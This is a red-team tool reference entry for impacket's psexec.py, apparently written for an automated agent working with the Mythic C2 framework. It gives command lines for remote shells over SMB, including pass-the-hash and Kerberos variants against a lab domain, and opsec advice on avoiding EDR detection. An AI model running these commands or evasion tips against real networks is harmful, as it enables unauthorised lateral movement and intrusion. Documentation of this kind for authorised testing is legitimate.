---
name: impacket-psexec
category: lateral-movement
subcategories: [smb-execution, service-based-exec, remote-shell]
tradecraft_tags: [psexec, smb, lateral-movement, impacket, python, admin-share, service]
mitre_attack:
  - id: T1021.002
    name: Remote Services — SMB/Windows Admin Shares
  - id: T1569.002
    name: System Services — Service Execution
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: psexec.py
supported_os: [linux]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  impacket psexec uploads a random-named binary to C$ or ADMIN$ share, creates a
  service, starts it, and deletes it. This generates: SMB share write (admin$), service
  creation (Event 7045 on target), service start (Event 7036), and service deletion.
  This is one of the most-detected lateral movement patterns; modern EDR catches it.
  Sysmon captures the service binary's process creation.
usage_examples:
  - description: Interactive SMB-based remote shell
    args: "psexec.py north.sevenkingdoms.local/administrator:Password123@192.168.56.22"
  - description: Pass-the-hash psexec
    args: "psexec.py -hashes :nthash north.sevenkingdoms.local/administrator@192.168.56.22"
  - description: Kerberos-based psexec
    args: "KRB5CCNAME=admin.ccache psexec.py -k -no-pass north.sevenkingdoms.local/administrator@192.168.56.22"
  - description: Non-interactive single command
    args: "psexec.py north.sevenkingdoms.local/administrator:Password123@192.168.56.22 'whoami'"
opsec_notes: |
  impacket psexec is VERY noisy — the service creation/deletion pattern (Event 7045)
  is a primary EDR detection trigger. Prefer smbexec.py (no binary drop) or wmiexec.py
  (no service) for lower-noise alternatives. For lateral movement from Apollo,
  use native spawn/inject or Mythic payload delivery.
gotchas: |
  Python-only — not Apollo-runnable. Service creation on the target generates high-fidelity
  detection events. Avoid in monitored environments. smbexec.py (also in impacket) is
  a lower-noise alternative that doesn't drop a binary but uses batch file execution.
  wmiexec.py is preferred for quieter WMI-based execution.
related_ttps: [impacket-wmiexec, crackmapexec, ntlmrelayx]
alternatives: [impacket-wmiexec, impacket-smbexec, crackmapexec-exec]
common_args:
  target:
    description: Target in DOMAIN/user:pass@IP format
    typical_values: ["north.sevenkingdoms.local/admin:pass@192.168.56.22"]
    required: true
  -hashes:
    description: NTLM hashes for pass-the-hash
    typical_values: [":nthash"]
  -k:
    description: Kerberos authentication
    typical_values: [flag-only]
  -no-pass:
    description: No password prompt (with -k)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# impacket-psexec

impacket's `psexec.py` — service-based remote execution over SMB. Uploads a binary
to the target's ADMIN$ share, creates a Windows service to run it, captures output,
and cleans up. Provides an interactive shell or single-command execution. One of the
most-detected lateral movement techniques; use wmiexec.py or smbexec.py for lower
noise in monitored environments.

## Typical use cases
- Quick interactive shell on a compromised machine using admin credentials
- Pass-the-hash lateral movement from Linux infrastructure

## How Sage uses this
Infrastructure-side Python tooling. Documented for completeness; wmiexec.py is
preferred for lower detection signal in most scenarios.

## Apollo-specific note
Python/Linux-only. Apollo-based lateral movement uses native commands or Mythic payload delivery.
